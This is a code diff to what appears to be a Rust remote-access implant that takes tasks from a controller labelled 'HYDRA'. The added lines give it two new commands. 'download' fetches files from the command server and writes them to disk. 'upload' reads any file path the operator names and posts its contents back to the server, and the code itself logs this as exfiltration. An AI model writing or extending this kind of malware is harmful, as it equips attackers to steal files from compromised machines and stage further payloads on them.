@@ -64,6 +64,38 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             println!("[!] Task Received: {}", action);
 
                             match action {
+                                "download" => {
+                                    let filename = data["filename"].as_str().unwrap_or("");
+                                    let url = format!("{}/download/{}", server_url, filename);
+                                    
+                                    println!(">> [ACTION] Downloading: {}", filename);
+                                    
+                                    if let Ok(resp) = client.get(&url).send().await {
+                                        if resp.status().is_success() {
+                                            let bytes = resp.bytes().await?;
+                                            std::fs::write(filename, bytes)?;
+                                            println!("[+] File saved: {}", filename);
+                                        }
+                                    }
+                                }
+                                "upload" => {
+                                    let filepath = data["path"].as_str().unwrap_or("");
+                                    let url = format!("{}/upload/{}", server_url, client_id);
+                                    
+                                    println!(">> [ACTION] Exfiltrating: {}", filepath);
+                                    
+                                    if let Ok(file_content) = std::fs::read(filepath) {
+                                        let part = reqwest::multipart::Part::bytes(file_content)
+                                            .file_name(filepath.to_string());
+                                        
+                                        let form = reqwest::multipart::Form::new().part("file", part);
+                                        
+                                        let _ = client.post(&url).multipart(form).send().await;
+                                        println!("[+] Exfiltration complete: {}", filepath);
+                                    } else {
+                                        println!("[-] Failed to read file: {}", filepath);
+                                    }
+                                }     
                                 "msg" => {
                                     let content = data["content"].as_str().unwrap_or("No content");
                                     println!(">> MESSAGE FROM HYDRA: {}", content);
